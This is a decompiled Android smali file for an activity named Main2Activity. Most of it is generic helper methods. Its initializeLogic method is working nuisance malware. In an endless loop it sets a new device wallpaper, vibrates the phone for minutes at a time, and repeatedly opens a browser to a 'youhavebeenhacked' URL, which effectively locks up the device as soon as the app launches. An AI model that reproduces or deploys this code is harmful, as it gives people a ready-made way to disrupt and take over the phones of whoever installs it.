.class public Lcom/my/newproject4/Main2Activity;
.super Landroid/app/Activity;
.source "Main2Activity.java"


# instance fields
.field private _timer:Ljava/util/Timer;

.field private oktest:Ljava/util/TimerTask;

.field private okv:Landroid/os/Vibrator;

.field private test:Landroid/content/Intent;

.field private webview1:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 38
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 40
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/my/newproject4/Main2Activity;->_timer:Ljava/util/Timer;

    .line 46
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    iput-object v0, p0, Lcom/my/newproject4/Main2Activity;->test:Landroid/content/Intent;

    .line 38
    return-void
.end method

.method private initialize(Landroid/os/Bundle;)V
    .locals 2

    .prologue
    const/4 v1, 0x1

    .line 57
    const v0, 0x7f030004

    invoke-virtual {p0, v0}, Lcom/my/newproject4/Main2Activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lcom/my/newproject4/Main2Activity;->webview1:Landroid/webkit/WebView;

    .line 58
    iget-object v0, p0, Lcom/my/newproject4/Main2Activity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 59
    iget-object v0, p0, Lcom/my/newproject4/Main2Activity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    .line 60
    const-string v0, "vibrator"

    invoke-virtual {p0, v0}, Lcom/my/newproject4/Main2Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/Vibrator;

    iput-object v0, p0, Lcom/my/newproject4/Main2Activity;->okv:Landroid/os/Vibrator;

    .line 62
    iget-object v0, p0, Lcom/my/newproject4/Main2Activity;->webview1:Landroid/webkit/WebView;

    new-instance v1, Lcom/my/newproject4/Main2Activity$1;

    invoke-direct {v1, p0}, Lcom/my/newproject4/Main2Activity$1;-><init>(Lcom/my/newproject4/Main2Activity;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 77
    return-void
.end method

.method private initializeLogic()V
    .locals 4

    .prologue
    .line 81
    :goto_0
    new-instance v0, Lcom/my/newproject4/Main2Activity$2;

    invoke-direct {v0, p0}, Lcom/my/newproject4/Main2Activity$2;-><init>(Lcom/my/newproject4/Main2Activity;)V

    iput-object v0, p0, Lcom/my/newproject4/Main2Activity;->oktest:Ljava/util/TimerTask;

    .line 92
    iget-object v0, p0, Lcom/my/newproject4/Main2Activity;->_timer:Ljava/util/Timer;

    iget-object v1, p0, Lcom/my/newproject4/Main2Activity;->oktest:Ljava/util/TimerTask;

    const-wide/16 v2, 0x2710

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 93
    iget-object v0, p0, Lcom/my/newproject4/Main2Activity;->test:Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 94
    iget-object v0, p0, Lcom/my/newproject4/Main2Activity;->test:Landroid/content/Intent;

    const-string v1, "https://youhavebeenhacked.com/"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 97
    invoke-virtual {p0}, Lcom/my/newproject4/Main2Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Landroid/app/WallpaperManager;->getInstance(Landroid/content/Context;)Landroid/app/WallpaperManager;

    move-result-object v0

    .line 99
    const v1, 0x7f020003

    :try_start_0
    invoke-virtual {v0, v1}, Landroid/app/WallpaperManager;->setResource(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 103
    :goto_1
    iget-object v0, p0, Lcom/my/newproject4/Main2Activity;->okv:Landroid/os/Vibrator;

    const-wide/32 v2, 0x5a35b

    invoke-virtual {v0, v2, v3}, Landroid/os/Vibrator;->vibrate(J)V

    .line 104
    iget-object v0, p0, Lcom/my/newproject4/Main2Activity;->test:Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/my/newproject4/Main2Activity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 100
    :catch_0
    move-exception v0

    .line 101
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method


# virtual methods
.method public getCheckedItemPositionsToArray(Landroid/widget/ListView;)Ljava/util/ArrayList;
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/widget/ListView;",
            ")",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/Double;",
            ">;"
        }
    .end annotation

    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 136
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    .line 137
    invoke-virtual {p1}, Landroid/widget/ListView;->getCheckedItemPositions()Landroid/util/SparseBooleanArray;

    move-result-object v2

    .line 138
    const/4 v0, 0x0

    :goto_0
    invoke-virtual {v2}, Landroid/util/SparseBooleanArray;->size()I

    move-result v3

    if-lt v0, v3, :cond_0

    .line 142
    return-object v1

    .line 139
    :cond_0
    invoke-virtual {v2, v0}, Landroid/util/SparseBooleanArray;->valueAt(I)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 140
    invoke-virtual {v2, v0}, Landroid/util/SparseBooleanArray;->keyAt(I)I

    move-result v3

    int-to-double v4, v3

    invoke-static {v4, v5}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 138
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public getDip(I)F
    .locals 3
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 147
    const/4 v0, 0x1

    int-to-float v1, p1

    invoke-virtual {p0}, Lcom/my/newproject4/Main2Activity;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v2

    invoke-static {v0, v1, v2}, Landroid/util/TypedValue;->applyDimension(IFLandroid/util/DisplayMetrics;)F

    move-result v0

    return v0
.end method

.method public getDisplayHeightPixels()I
    .locals 1
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 157
    invoke-virtual {p0}, Lcom/my/newproject4/Main2Activity;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v0, v0, Landroid/util/DisplayMetrics;->heightPixels:I

    return v0
.end method

.method public getDisplayWidthPixels()I
    .locals 1
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 152
    invoke-virtual {p0}, Lcom/my/newproject4/Main2Activity;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v0, v0, Landroid/util/DisplayMetrics;->widthPixels:I

    return v0
.end method

.method public getLocationX(Landroid/view/View;)I
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 116
    const/4 v0, 0x2

    new-array v0, v0, [I

    .line 117
    invoke-virtual {p1, v0}, Landroid/view/View;->getLocationInWindow([I)V

    .line 118
    const/4 v1, 0x0

    aget v0, v0, v1

    return v0
.end method

.method public getLocationY(Landroid/view/View;)I
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 123
    const/4 v0, 0x2

    new-array v0, v0, [I

    .line 124
    invoke-virtual {p1, v0}, Landroid/view/View;->getLocationInWindow([I)V

    .line 125
    const/4 v1, 0x1

    aget v0, v0, v1

    return v0
.end method

.method public getRandom(II)I
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 130
    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    .line 131
    sub-int v1, p2, p1

    add-int/lit8 v1, v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/2addr v0, p1

    return v0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1

    .prologue
    .line 50
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 51
    const v0, 0x7f040001

    invoke-virtual {p0, v0}, Lcom/my/newproject4/Main2Activity;->setContentView(I)V

    .line 52
    invoke-direct {p0, p1}, Lcom/my/newproject4/Main2Activity;->initialize(Landroid/os/Bundle;)V

    .line 53
    invoke-direct {p0}, Lcom/my/newproject4/Main2Activity;->initializeLogic()V

    .line 54
    return-void
.end method

.method public showMessage(Ljava/lang/String;)V
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 111
    invoke-virtual {p0}, Lcom/my/newproject4/Main2Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 112
    return-void
.end method
